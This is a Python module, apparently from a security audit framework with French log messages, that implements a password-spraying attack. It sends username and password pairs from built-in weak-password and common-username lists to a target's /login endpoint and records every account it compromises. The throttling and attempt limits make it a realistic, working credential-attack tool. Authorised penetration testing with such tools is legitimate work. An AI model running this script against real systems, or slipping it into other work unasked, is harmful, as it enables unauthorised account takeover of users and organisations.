from __future__ import annotations
import logging
import time
from pathlib import Path
from typing import Iterable, Iterator

import requests

from ..core.http_utils import is_login_success
from ..core.plugin_base import AttackModule, AttackResult
from ..core.registry import register

logger = logging.getLogger(__name__)

DEFAULT_USERNAMES = ["admin", "administrator", "root", "user", "test", "guest"]
DEFAULT_PASSWORDS = ["Password1", "Welcome1", "Summer2024!", "Azerty123"]


def load_lines(path: str | Path) -> Iterator[str]:
    path = Path(path)
    if not path.exists():
        raise FileNotFoundError(f"Fichier introuvable : {path}")
    with path.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.rstrip("\n\r")
            if line and not line.startswith("#"):
                yield line


def _resolve(value, default: list[str]) -> Iterator[str]:
    if value is None:
        return iter(default)
    if isinstance(value, (str, Path)):
        return load_lines(value)
    return iter(value)


@register
class PasswordSprayingModule(AttackModule):
    name = "password_spraying"
    iso_controls = ("A.9",)

    def run(
        self,
        target: str,
        usernames: str | Path | Iterable[str] | None = None,
        passwords: str | Path | Iterable[str] | None = None,
        delay: float = 1.0,
        max_attempts_per_user: int = 1,
        timeout: float = 3.0,
        **kwargs,
    ) -> AttackResult:
        if not target.startswith(("http://", "https://")):
            raise ValueError(f"target doit être une URL http(s), reçu : {target!r}")
        if max_attempts_per_user < 1:
            raise ValueError("max_attempts_per_user doit être >= 1")

        username_list = list(_resolve(usernames, DEFAULT_USERNAMES))
        password_iter = _resolve(passwords, DEFAULT_PASSWORDS)

        session = requests.Session()
        attempts = 0
        network_errors = 0
        compromised: list[dict[str, str]] = []

        try:
            for round_index, password in enumerate(password_iter):
                if round_index >= max_attempts_per_user:
                    logger.warning(
                        "Limite de %d passe(s) atteinte, arrêt.", max_attempts_per_user
                    )
                    break

                for username in username_list:
                    attempts += 1
                    try:
                        resp = session.post(
                            f"{target.rstrip('/')}/login",
                            json={"username": username, "password": password},
                            timeout=timeout,
                        )
                    except requests.exceptions.RequestException as exc:
                        network_errors += 1
                        logger.debug("Tentative %d échouée (réseau) : %s", attempts, exc)
                        continue

                    if is_login_success(resp):
                        compromised.append({"username": username, "password": password})
                        logger.info("Compte compromis : %s", username)

                    if delay:
                        time.sleep(delay)
        finally:
            session.close()

        success = bool(compromised)
        if success:
            summary = (
                f"{len(compromised)} compte(s) compromis sur {len(username_list)} "
                f"testé(s), en {attempts} tentative(s)."
            )
        else:
            summary = (
                f"Aucun compte compromis parmi {len(username_list)} testé(s), "
                f"après {attempts} tentative(s) ({network_errors} erreur(s) réseau)."
            )

        return AttackResult(
            module_name=self.name,
            success=success,
            summary=summary,
            evidence={
                "attempts": attempts,
                "erreurs_reseau": network_errors,
                "comptes_compromis": compromised,
                "nb_comptes_testes": len(username_list),
            },
        )